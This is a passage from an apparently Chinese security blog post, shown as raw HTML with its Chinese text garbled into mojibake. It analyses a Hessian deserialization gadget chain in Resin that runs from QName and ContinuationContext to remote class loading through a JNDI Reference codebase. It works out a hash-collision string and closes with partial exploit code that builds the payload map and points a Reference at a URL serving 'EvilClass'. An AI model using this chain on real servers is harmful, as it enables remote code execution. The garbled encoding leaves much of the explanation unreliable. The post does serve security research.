class="line">            name = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>è¿™é‡Œè¦æ±‚ <code>_items</code> ä¸­è‡³å°‘æœ‰ä¸¤é¡¹ï¼Œè¿™æ ·åœ¨ <code>toString</code> çš„å¾ªç¯ä¸­ï¼š</p>
<ul>
<li>ç¬¬ä¸€æ¬¡å¾ªç¯æ—¶ <code>name</code> ä¸º <code>null</code>ï¼Œå› æ­¤ä¼šèµ° <code>else</code> åˆ†æ”¯å°†å½“å‰å­—ç¬¦ä¸²èµ‹å€¼ç»™ <code>name</code>ã€‚</li>
<li>ç¬¬äºŒæ¬¡å¾ªç¯æ—¶ è§¦å‘ <code>_context.composeName(str, name)</code> è°ƒç”¨ã€‚</li>
</ul>

    </div>
  </div>

<p>æˆ‘ä»¬å°† <code>_context</code> è®¾ç½®ä¸º <code>javax.naming.spi.ContinuationContext</code> åˆ™ <code>composeName</code> æ–¹æ³•ä¼šæœ‰å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:87)</span><br><span class="line">at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:158)</span><br><span class="line">at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)</span><br><span class="line">at javax.naming.spi.NamingManager.getContext(NamingManager.java:439)</span><br><span class="line">at javax.naming.spi.ContinuationContext.getTargetContext(ContinuationContext.java:55)</span><br><span class="line">at javax.naming.spi.ContinuationContext.composeName(ContinuationContext.java:180)</span><br><span class="line">at com.caucho.naming.QName.toString(QName.java:353)</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆåœ¨ <code>ContinuationContext#getTargetContext</code> ä¼š <code>cpe.getResolvedObj()</code> è·å– <code>Reference</code> å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> CannotProceedException cpe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Context <span class="title function_">getTargetContext</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (contCtx == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cpe.getResolvedObj() == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)cpe.fillInStackTrace();</span><br><span class="line"></span><br><span class="line">        contCtx = NamingManager.getContext(cpe.getResolvedObj(), <span class="comment">// ğŸ‘ˆ</span></span><br><span class="line">                                           cpe.getAltName(),</span><br><span class="line">                                           cpe.getAltNameCtx(),</span><br><span class="line">                                           env);</span><br><span class="line">        <span class="keyword">if</span> (contCtx == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)cpe.fillInStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> contCtx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>cpe.getResolvedObj()</code> å®é™…ä¸Šè°ƒç”¨çš„æ˜¯ <code>javax.naming.NamingException#getResolvedObj</code>ï¼Œä¹Ÿå°±æ˜¯å°† <code>resolvedObj</code> å±æ€§è¿”å›ï¼Œ</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object resolvedObj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getResolvedObj</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> resolvedObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬åŒæ ·å¯ä»¥è°ƒç”¨ <code>NamingException#setResolvedObj</code> è®¾ç½®ä¸€ä¸ª <code>Reference</code> å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setResolvedObj</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    resolvedObj = obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹ååœ¨ <code>NamingManager#getObjectInstance</code> ä»è·å–åˆ°çš„ <code>Reference</code> å¯¹è±¡ä¸­æå–å·¥å‚ç±»åï¼ˆ<code>classFactory</code>ï¼‰ä½œä¸ºå‚æ•°å’Œ <code>Reference</code> å¯¹è±¡æœ¬èº«ä¸€èµ·ä¼ å…¥ <code>getObjectFactoryFromReference</code> å‚æ•°ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// â‘  è‹¥ç³»ç»Ÿå®‰è£…äº†å…¨å±€çš„ ObjectFactoryBuilderï¼Œåˆ™ä¼˜å…ˆç”±å®ƒåˆ›å»ºå·¥å‚</span></span><br><span class="line">    <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();</span><br><span class="line">    <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// è§„èŒƒè¦æ±‚ï¼šbuilder ä¸èƒ½è¿”å› null</span></span><br><span class="line">        factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">        <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx, environment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// â‘¡ è‹¥å…¥å‚å¯è§†ä½œ Referenceï¼Œåˆ™å°½é‡è½¬æˆ javax.naming.Reference</span></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        ref = (Reference) refInfo;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// â‘¢ Reference è‹¥å£°æ˜äº† factory classï¼ˆå·¥å‚ç±»åï¼‰ï¼Œåˆ™â€œåªç”¨å®ƒâ€</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// é€šè¿‡ç±»åï¼ˆå¯èƒ½ç»“åˆ codebase/URL åœ°å€ï¼‰å»åŠ è½½å¹¶åˆ›å»ºè¯¥ ObjectFactory</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getObjectFactoryFromReference</code> åˆ™ç›´æ¥æ ¹æ® <code>Reference</code> å¯¹è±¡ä¸­çš„å·¥å‚ç±»åå’Œ <code>codebase</code> è¿œç¨‹åŠ è½½ç±»ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">    InstantiationException,</span><br><span class="line">    MalformedURLException &#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œçš„ <code>helper</code> å®é™…ä¸Šæ˜¯ <code>VersionHelper12</code>ï¼Œè€Œ <code>VersionHelper12</code> å¯¹è±¡çš„ <code>loadClass</code> æ–¹æ³•ä¼šé€šè¿‡ <code>URLClassLoader</code> è¿œç¨‹åŠ è½½åŠ è½½ç±»ã€‚</p>
<blockquote>
<p><code>VersionHelper</code> å’Œ <code>VersionHelper12</code> å±äº <strong>JNDI å†…éƒ¨å·¥å…·ç±»</strong>ï¼ˆåŒ…åé€šå¸¸æ˜¯ <code>com.sun.naming.internal</code>ï¼‰ï¼Œç”¨äº<strong>å±è”½ä¸åŒ JDK ç‰ˆæœ¬çš„å·®å¼‚</strong>ï¼Œå°¤å…¶æ˜¯<strong>ç±»åŠ è½½</strong>ç›¸å…³ï¼ˆTCCLã€URLClassLoaderã€codebase è§£æç­‰ï¼‰ã€‚</p>
</blockquote>
<p>æœ€åï¼Œä¸ºäº†èƒ½è§¦å‘ <code>equal</code> æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦è®© <code>QName</code> å’Œ <code>xString</code> çš„ <code>hashCode</code> è¿”å›å€¼ç›¸åŒã€‚</p>
<ul>
<li><p><code>XString</code> çš„ <code>hashCode</code> å®ç°å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> str().hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">str</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">null</span> != m_obj) ? ((String) m_obj) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>XString</code> çš„æ„é€ å‡½æ•°å°†ä¼ å…¥çš„å‚æ•° <code>val</code> å­—ç¬¦ä¸²äº¤ç»™çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">XString</span><span class="params">(String val)</span> &#123;<span class="built_in">super</span>(val);&#125;</span><br></pre></td></tr></table></figure></div>

<p>çˆ¶ç±» <code>XObject</code> å°†å…¶è®¾ç½®åˆ° <code>m_obj</code> ä¸­ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">XObject</span><span class="params">(Object obj)</span> &#123;setObject(obj);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setObject</span><span class="params">(Object obj)</span> &#123;m_obj = obj;&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤ <code>XString</code> çš„ <code>hashCode</code> å…¶å®å°±æ˜¯å­—ç¬¦ä¸²å“ˆå¸Œã€‚è€Œ <code>String</code> çš„ <code>hashCode</code> å®ç°å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> hash; <span class="comment">// Default to 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>QName</code> çš„ <code>hashCode</code> å®ç°å¦‚ä¸‹ï¼š</p>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> <span class="number">337</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        hashCode = <span class="number">65521</span> * hashCode + get(i).hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>  å› æ­¤ <code>QName.hashCode() = 337 * 65521^2 + 65521 * hash(rest) + hash(first) = -662,493,135 + 65521 * hash(rest) + hash(first)</code>ã€‚</p>
</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬ä»¤ <code>rest</code> å’Œ <code>first</code> å‡ä¸ºç©ºä¸²ï¼Œåˆ™ <code>hash(rest) = hash(first) = 0</code>ï¼Œå³ <code>QName.hashCode() = -662,493,135</code>ã€‚</p>
<p>æ­¤æ—¶æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾ä¸€ä¸ªå“ˆå¸Œå€¼ä¸º <code>-662,493,135</code> çš„å­—ç¬¦ä¸²å³å¯ã€‚ </p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> String <span class="title function_">uppercaseStringWithHash</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">base</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;        <span class="comment">// 65</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">7</span>;             <span class="comment">// 7 ä½è¶³å¤Ÿè¦†ç›– 2^32</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">T</span> <span class="operator">=</span> Integer.toUnsignedLong(target);</span><br><span class="line">    <span class="type">long</span> <span class="variable">term</span> <span class="operator">=</span> (pow31(n) - <span class="number">1</span>) / <span class="number">30</span>;         <span class="comment">// 1 + 31 + ... + 31^(n-1)</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">s</span> <span class="operator">=</span> (T - (<span class="type">long</span>)base * term) &amp; <span class="number">0xFFFF_FFFFL</span>;</span><br><span class="line">    <span class="keyword">if</span> (s &gt;= pow31(n)) &#123;                      <span class="comment">// ç†è®ºä¸Š n=7 ä¸ä¼šè§¦å‘</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;increase n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span>[] digits = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;        <span class="comment">// æŠŠ s ç”¨ 31 è¿›åˆ¶æ‹†æˆæ°å¥½ n ä½</span></span><br><span class="line">        digits[i] = (<span class="type">int</span>)(s % <span class="number">31</span>);</span><br><span class="line">        s /= <span class="number">31</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>[] chars = <span class="keyword">new</span> <span class="title class_">char</span>[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) chars[i] = (<span class="type">char</span>) (base + digits[i]); <span class="comment">// å¹³ç§»åˆ°å¤§å†™åŒº</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="type">long</span> <span class="title function_">pow31</span><span class="params">(<span class="type">int</span> n)</span> &#123; <span class="type">long</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">1</span>; <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) p *= <span class="number">31</span>; <span class="keyword">return</span> p; &#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”¨è¿™ä¸ªå‡½æ•°è®¡ç®—å¾—ï¼š</p>
<ul>
<li><code>uppercaseStringWithHash( 662_493_135 )</code> â†’ <code>&quot;BKIGJUA&quot;</code></li>
<li><code>uppercaseStringWithHash(-662_493_135 )</code> â†’ <code>&quot;EVAEGSR&quot;</code></li>
</ul>
<p>å› æ­¤ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ¡ˆ Aï¼šä¸¤è¾¹å“ˆå¸Œéƒ½ä¸º 0</span></span><br><span class="line"><span class="type">String</span> <span class="variable">first</span> <span class="operator">=</span> <span class="string">&quot;BKIGJUA&quot;</span>;  <span class="comment">// first.hashCode() ==  662493135</span></span><br><span class="line"><span class="type">String</span> <span class="variable">rest</span>  <span class="operator">=</span> <span class="string">&quot;&quot;</span>;         <span class="comment">// rest.hashCode()  ==           0</span></span><br><span class="line"><span class="type">String</span> <span class="variable">xVal</span>  <span class="operator">=</span> <span class="string">&quot;&quot;</span>;         <span class="comment">// xVal.hashCode()  ==           0</span></span><br><span class="line"><span class="comment">// new QName(ctx, first, rest).hashCode() == new XString(xVal).hashCode() == 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ¡ˆ Bï¼šä¸¤è¾¹å“ˆå¸Œéƒ½ä¸º C = 337*65521^2</span></span><br><span class="line"><span class="type">String</span> <span class="variable">first2</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;        <span class="comment">// hash == 0</span></span><br><span class="line"><span class="type">String</span> <span class="variable">rest2</span>  <span class="operator">=</span> <span class="string">&quot;&quot;</span>;        <span class="comment">// hash == 0</span></span><br><span class="line"><span class="type">String</span> <span class="variable">xVal2</span>  <span class="operator">=</span> <span class="string">&quot;EVAEGSR&quot;</span>; <span class="comment">// xVal2.hashCode() == -662493135ï¼ˆå³ Cï¼‰</span></span><br></pre></td></tr></table></figure></div>

<h4 id="åˆ©ç”¨ä»£ç -10"><a href="#åˆ©ç”¨ä»£ç -10" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianResin</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;EVAEGSR&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">contextClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> contextClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> (Context) constructor.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>());</span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(context, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(qName.hashCode());</span><br><span class="line">        System.out.println(xString.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line">        set.put(qName, <span class="number">0</span>);</span><br><span class="line">        set.put(xString, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;EvilClass&quot;</span>, url));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        getObject(<span class="string">&quot;http://127.0.0.1:9999/&quot;</span>);</span><br><span class="line">        <span class="type">HessianProxyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 